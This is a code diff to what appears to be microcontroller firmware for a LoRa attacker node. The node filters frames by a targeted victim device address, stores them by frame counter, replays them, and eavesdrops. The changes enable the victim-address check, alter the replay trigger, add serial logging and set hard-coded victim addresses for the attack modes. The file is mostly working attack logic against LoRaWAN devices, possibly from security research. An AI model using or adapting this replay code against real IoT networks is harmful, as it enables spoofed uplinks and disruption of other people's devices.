@@ -175,10 +175,8 @@ void setFcnt() {
             fcnt = ((fcntHigh + 1) << 16) + receivedFCnt;
         }
     }
-    
-    Serial.print("FCnt: ");
+    Serial.print(" FCnt: ");
     Serial.print(fcnt);
-    Serial.println("");
 }
 
 
@@ -196,9 +194,9 @@ bool frameBelongsToVictim() {
 
     setdevAddr();
 
-    // for(int i=0; i<4; i++) 
-    //     if(devAddr[i] != victimAddress[i]) 
-    //         return false;
+    for(int i=0; i<4; i++) 
+        if(devAddr[i] != victimAddress[i]) 
+            return false;
     
     return true;
 }
@@ -224,6 +222,7 @@ void storeFrame() {
     // frame to store all info
     std::vector<uint8_t> frame = buildFrame();
     
+    Serial.println(" Storing Frame");
     receivedFrames.push_back(frame);
 
     lastFcnt = fcnt;
@@ -241,6 +240,10 @@ void replayFrame() {
     rf95.setHeaderId(frame[2]);
     rf95.setHeaderFlags(frame[3]);
     rf95.send(&frame[4], frame.size() - 4);
+
+    Serial.println("Replaying Frame: ");
+    printBytes(&frame[0], frame.size());
+    Serial.println("");
 }
 
 
@@ -262,23 +265,31 @@ void attackFinish() {
     if(attackMode == ReplayAttack) {
         replayAttackInit();
     }
+
+    Serial.print("Next attack scheduled: ");
+    Serial.println(attackMode);
 }
 
 void replayAttackRoutine() {
 
     if(receiveLoRaFrame())
-    {           
+    {
+        //std::vector<uint8_t> frame = buildFrame();
+        //printBytes(&frame[0], frame.size());
+
         if(frameBelongsToVictim()) 
         {
             setFcnt();
 
             if(fcnt >= lastFcnt + gap || fcnt == maxFcnt) {
                 storeFrame();
-            } else if(receivedFrames.size() > 0 && fcnt + gap <firstFcnt) {
+            } else if(receivedFrames.size() > 0 && fcnt + gap <lastFcnt) {
                 replayFrame();
                 attackFinish();
             }
         }
+
+        Serial.println("");
     }
 }
 
@@ -299,6 +310,8 @@ void eavesdroppingRoutine() {
         else if(frameIsAttackTerminationSignal()) {
             attackFinish();
         }
+
+        Serial.println("");
     }
 }
 
@@ -938,13 +951,15 @@ lmic_tx_error_t scheduleUplink(uint8_t fPort, uint8_t* data, uint8_t dataLength,
 
 void sendVictimFrame() {
 
+    setFcnt();
+    Serial.print(" Frame: ");
     std::vector<uint8_t> frame = buildFrame();
     printBytes(&frame[0], frame.size());
 
     // LMIC not working
-    LMIC_setSeqnoUp(fcnt);
-    const int dataStart = 4;
-    scheduleUplink(10,rxBuffer + dataStart, rxRecvLen -dataStart);
+    // LMIC_setSeqnoUp(fcnt);
+    // const int dataStart = 4;
+    // scheduleUplink(10,rxBuffer + dataStart, rxRecvLen -dataStart);
 }
 
 
@@ -1168,22 +1183,22 @@ void setup()
 
     attackerNodeSetup();
 
-    uint8_t downlinkMessage[8] = { 
-        0xFF, 0xFF, 0xFF, 0xFF, // Victim address 
-        0x01, // Replay Attack
-        0x00, // 16-bit counter
-        0x27, 0x10 // Gap = 10 000
-    };
-    uint8_t downlinkLength = 8;
-
-
     // uint8_t downlinkMessage[8] = { 
-    //     0xFF, 0xFF, 0xFF, 0xFF, // Victim address 
-    //     0x02, // Eavesdropping
-    //     0x01, // 32-bit counter
-    //     // No need for Gap param
+    //     0x01, 0x6b, 0x9d, 0x0a,   // Victim address //016b9d0a
+    //     0x01, // Replay Attack
+    //     0x00, // 16-bit counter
+    //     0x27, 0x10 // Gap = 10 000
     // };
-    // uint8_t downlinkLength = 6;
+    // uint8_t downlinkLength = 8;
+
+
+    uint8_t downlinkMessage[8] = { 
+        0x01, 0x03, 0xae, 0x63, // Victim address //0103ae63
+        0x02, // Eavesdropping
+        0x01, // 32-bit counter
+        // No need for Gap param
+    };
+    uint8_t downlinkLength = 6;
 
     // uint8_t downlinkMessage[8] = { 
     //     0xFF, 0xFF, 0xFF, 0xFF, // Victim address 
